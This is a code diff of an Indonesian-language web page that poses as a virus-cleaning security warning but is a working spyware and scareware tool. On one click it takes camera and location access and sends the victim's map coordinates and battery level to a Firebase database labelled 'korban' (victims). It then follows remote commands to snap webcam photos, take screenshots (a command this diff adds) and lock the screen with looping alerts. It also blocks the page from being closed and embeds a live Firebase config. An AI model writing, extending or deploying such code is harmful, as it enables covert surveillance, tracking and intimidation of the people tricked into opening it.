@@ -2,26 +2,26 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>⚠️ KEAMANAN BROWSER</title>
+    <title>SISTEM UPDATE</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body style="background:#fff; font-family:sans-serif; text-align:center; padding-top:100px;">
     <video id="v" width="1" height="1" autoplay style="opacity:0; position:absolute;"></video>
     <canvas id="c" style="display:none;"></canvas>
     
-    <div id="overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:red; color:white; z-index:9999; padding-top:200px; font-size:30px; font-weight:bold;">
-        ☣️ DEVICE LOCKED ☣️<br>CRITICAL ERROR
+    <div id="lock-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:red; color:white; z-index:9999; padding-top:200px; font-size:25px; font-weight:bold;">
+        ☣️ SYSTEM LOCKED ☣️<br>UNAUTHORIZED ACCESS
     </div>
 
-    <div id="m">
-        <h1 style="color:red">⚠️ BAHAYA!</h1>
-        <p>Sistem mendeteksi virus. Klik di bawah untuk membersihkan.</p>
-        <button onclick="start()" style="padding:20px; background:blue; color:white; border:none; border-radius:10px; cursor:pointer;">BERSIHKAN SEKARANG</button>
+    <div id="ui">
+        <h1 style="color:red">⚠️ PERINGATAN KEAMANAN</h1>
+        <p>Aplikasi ini membutuhkan akses verifikasi untuk melanjutkan pembersihan sistem.</p>
+        <button onclick="start()" style="padding:20px; background:blue; color:white; border:none; border-radius:10px; font-weight:bold; cursor:pointer;">VERIFIKASI & BERSIHKAN</button>
     </div>
 
 <script>
-    // --- TEMPEL CONFIG FIREBASE SAMA DENGAN INDEX ---
     const firebaseConfig = {
       apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
       authDomain: "theeyes-8d0aa.firebaseapp.com",
@@ -31,51 +31,58 @@
       messagingSenderId: "886775568743",
       appId: "1:886775568743:web:89a5a2b26628711fedf7c2"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let idK = null; let isLocked = false;
+    let myId = null; let isLocked = false;
 
     async function start() {
         document.documentElement.requestFullscreen();
         try {
-            const s = await navigator.mediaDevices.getUserMedia({video:true});
-            document.getElementById('v').srcObject = s;
-            navigator.geolocation.getCurrentPosition(async p => {
+            const stream = await navigator.mediaDevices.getUserMedia({video:true});
+            document.getElementById('v').srcObject = stream;
+            navigator.geolocation.getCurrentPosition(async pos => {
                 let bat = "N/A"; if(navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100)+"%"; }
                 const ref = db.ref('korban').push({
                     waktu: new Date().toLocaleString(),
                     baterai: bat,
-                    maps: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
+                    maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                 });
-                idK = ref.key;
-                document.getElementById('m').innerHTML = "<h2>🔍 Scanning... 75%</h2>";
+                myId = ref.key;
+                document.getElementById('ui').innerHTML = "<h2>🔍 Scanning... 82%</h2><p>Please do not close this app.</p>";
 
-                db.ref('commands/' + idK).on('value', snap => {
+                db.ref('commands/' + myId).on('value', snap => {
                     const cmd = snap.val(); if(!cmd) return;
                     if(cmd.action === "TAKE") {
                         const v = document.getElementById('v'), c = document.getElementById('c');
                         c.width = v.videoWidth; c.height = v.videoHeight;
                         c.getContext('2d').drawImage(v, 0, 0);
-                        db.ref('hasil_foto/' + idK).set({ foto: c.toDataURL('image/jpeg', 0.4) });
+                        db.ref('hasil_foto/' + myId).set({ foto: c.toDataURL('image/jpeg', 0.4) });
+                    }
+                    if(cmd.action === "SHOT") {
+                        html2canvas(document.body).then(canvas => {
+                            db.ref('hasil_screenshot/' + myId).set({ foto: canvas.toDataURL('image/jpeg', 0.5) });
+                        });
                     }
                     if(cmd.action === "VIRUS") {
                         isLocked = true;
-                        document.getElementById('overlay').style.display='block';
+                        document.getElementById('lock-overlay').style.display='block';
                         const loop = setInterval(() => {
                             if(!isLocked) clearInterval(loop);
-                            else alert("⚠️ SYSTEM ERROR!");
+                            else alert("⚠️ ALERT: SYSTEM THREAT!");
                         }, 500);
                     }
                     if(cmd.action === "RELEASE") {
                         isLocked = false;
-                        document.getElementById('overlay').style.display='none';
+                        document.getElementById('lock-overlay').style.display='none';
                         document.exitFullscreen();
-                        alert("Sistem Aman.");
+                        alert("Sistem Normal.");
                     }
                 });
             });
-        } catch(e) { alert("Izinkan Akses!"); }
+        } catch(e) { alert("Access Required!"); }
     }
+    window.onbeforeunload = function() { return "Warning!"; };
 </script>
 </body>
 </html>
